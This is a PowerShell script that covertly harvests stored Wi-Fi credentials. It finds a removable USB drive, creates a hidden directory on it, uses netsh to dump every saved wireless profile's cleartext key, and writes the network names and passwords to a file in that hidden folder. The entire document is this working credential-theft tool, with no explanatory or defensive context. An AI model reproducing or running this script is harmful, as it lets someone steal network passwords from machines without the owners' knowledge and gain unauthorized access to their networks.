# Define the USB drive path and hidden directory name
$usbDrive = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE DriveType=2").DriveLetter + "\"
$hiddenDir = "_usb"
$outputFile = "wifi_passwords.txt"

# Create the hidden directory on the USB drive
$hiddenPath = Join-Path -Path $usbDrive -ChildPath $hiddenDir
if (-not (Test-Path $hiddenPath)) {
    New-Item -Path $hiddenPath -ItemType Directory -Force | Out-Null
    attrib +h $hiddenPath  # Hide the directory
}

# Extract Wi-Fi profiles and passwords
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }

$outputPath = Join-Path -Path $hiddenPath -ChildPath $outputFile
foreach ($profile in $wifiProfiles) {
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    if ($password) {
        Add-Content -Path $outputPath -Value "Wi-Fi Name: $profile"
        Add-Content -Path $outputPath -Value "Password: $password"
        Add-Content -Path $outputPath -Value "-----------------------------"
    }
}
